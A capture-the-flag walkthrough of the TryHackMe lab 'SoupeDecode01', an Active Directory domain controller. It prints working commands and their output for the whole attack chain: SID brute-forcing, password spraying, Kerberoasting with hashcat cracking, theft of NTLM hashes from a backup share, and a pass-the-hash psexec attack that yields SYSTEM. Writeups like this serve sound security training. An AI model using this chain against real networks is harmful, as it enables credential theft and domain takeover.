<div align="center">

# 🥣 TryHackMe: SoupeDecode01 — Writeup

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=flat-square)
![OS](https://img.shields.io/badge/OS-Windows%20Server-0078D6?style=flat-square&logo=windows)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=flat-square)
![Category](https://img.shields.io/badge/Category-Active%20Directory-blue?style=flat-square)

From initial port scanning to `NT AUTHORITY\SYSTEM` on an Active Directory Domain Controller.

[Русская версия](README_RU.md)

</div>

---

## 📑 Table of Contents

- [Overview](#-overview)
- [1. Reconnaissance & Port Scanning](#1-reconnaissance--port-scanning)
- [2. User Enumeration](#2-user-enumeration)
- [3. Initial Access](#3-initial-access)
- [4. Privilege Escalation](#4-privilege-escalation)
- [Summary](#-summary)

---

## 📝 Overview

| | |
|---|---|
| **Target** | `10.113.138.0` (DC01.SOUPEDECODE.LOCAL) |
| **Techniques** | SID brute-force, Password Spraying, Kerberoasting, Pass-the-Hash |
| **Tools** | `nmap`, `netexec (nxc)`, `impacket`, `smbclient`, `hashcat` |

---

## 1. Reconnaissance & Port Scanning

As always, we start with port scanning to understand the target's running services and determine our attack vector.

```bash
sudo nmap -sC -sV 10.113.138.0
```

**Nmap Output:**

```text
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-02 08:45 -0500
Nmap scan report for 10.113.138.0
Host is up (0.35s latency).
Not shown: 988 filtered tcp ports (no-response)

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-02 13:46:25Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
...
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
|   DNS_Domain_Name: SOUPEDECODE.LOCAL
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
```

The port scan confirms we are dealing with an Active Directory Domain Controller. We also discovered the domain `SOUPEDECODE.LOCAL`, which we should add to our `/etc/hosts` file.

Next, we check for available SMB shares using a null/guest session:

```bash
nxc smb 10.113.138.0 -u "guest" -p "" --shares
```

> We only have access to standard default shares (`IPC$`). Attempting to enumerate users directly via `nxc` (`--users`) also yielded no results.

---

## 2. User Enumeration

Since direct SMB enumeration failed, we can try to brute-force SIDs (Security Identifiers) to get a list of domain users:

```bash
impacket-lookupsid soupedeconde.local/guest:@10.113.138.0
```

**Output:**

```text
[*] Brute forcing SIDs at 10.113.138.0
[*] Domain SID is: S-1-5-21-2986980474-46765180-2505414164
500: SOUPEDECODE\Administrator (SidTypeUser)
501: SOUPEDECODE\Guest (SidTypeUser)
...
2163: SOUPEDECODE\firewall_svc (SidTypeUser)
2164: SOUPEDECODE\backup_svc (SidTypeUser)
2165: SOUPEDECODE\web_svc (SidTypeUser)
2166: SOUPEDECODE\monitoring_svc (SidTypeUser)
2168: SOUPEDECODE\admin (SidTypeUser)
```

This gave us a massive list of domain users. We filter out the output to keep only the usernames and save them to a file named `users.txt`. An attempt at AS-REP Roasting returned nothing.

---

## 3. Initial Access

Let's try a basic Password Spray attack, assuming someone might be using their username as their password:

```bash
nxc smb 10.113.138.0 -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

✅ **Success!** We found a lazy user: `ybob317:ybob317`.

Let's check which shares we can access with these credentials:

```bash
nxc smb 10.113.138.0 -u "ybob317" -p "ybob317" --shares
```

Besides the default ones, we have READ access to a non-standard `Users` share. We connect to it using `smbclient` and grab our first flag:

```bash
smbclient //10.113.138.0/Users -U "ybob317%ybob317"
smb: \> cd ybob317\Desktop
smb: \ybob317\Desktop\> get user.txt
```

🚩 **User Flag Captured!**

---

## 4. Privilege Escalation

Any standard domain user has the right to request Kerberos tickets (TGS) for any service with a registered SPN. We can exploit this via Kerberoasting:

```bash
impacket-GetUserSPNs soupedecode.local/ybob317:ybob317 -dc-ip 10.113.138.0 -request -outputfile hash.txt
```

We successfully requested and captured hashes for several service accounts (`file_svc`, `firewall_svc`, `backup_svc`, `web_svc`, `monitoring_svc`).

We proceed to crack them offline using `hashcat` and the `rockyou` wordlist:

```bash
hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
cat cracked.txt
```

One password was cracked: `Password123!!`.

Let's verify which account it belongs to:

```bash
nxc smb 10.113.138.0 -u "file_svc" -p 'Password123!!'
```

It matches the `file_svc` account! Checking its permissions reveals it has READ access to the `backup` share.

Downloading the contents of the share:

```bash
smbclient //10.113.138.0/backup -U 'file_svc%Password123!!'
smb: \> get backup_extract.txt
```

Inside `backup_extract.txt`, we find NTLM hashes for Machine Accounts:

```text
WebServer:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
FileServer:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
...
```

We can now execute a **Pass-The-Hash** (PtH) attack using the `FileServer$` account hash to get a system shell:

```bash
impacket-psexec SOUPEDECODE.LOCAL/FileServer\$@10.113.138.0 -hashes :e41da7e79a4c76dbd9cf79d1cb325559
```

**Result:**

```text
[*] Starting service SMwz.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.587]
C:\Windows\system32> whoami
nt authority\system
```

Reading the root flag:

```cmd
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
27cb2be302c388d63d27c......
```

---

## 🏁 Summary

**Machine successfully pwned!** Attack chain:

```
Guest SMB → SID Brute-force → Password Spray → User Flag
    → Kerberoasting → Hash Crack → Backup Share
    → Machine Hash Leak → Pass-the-Hash → SYSTEM / Root Flag
```

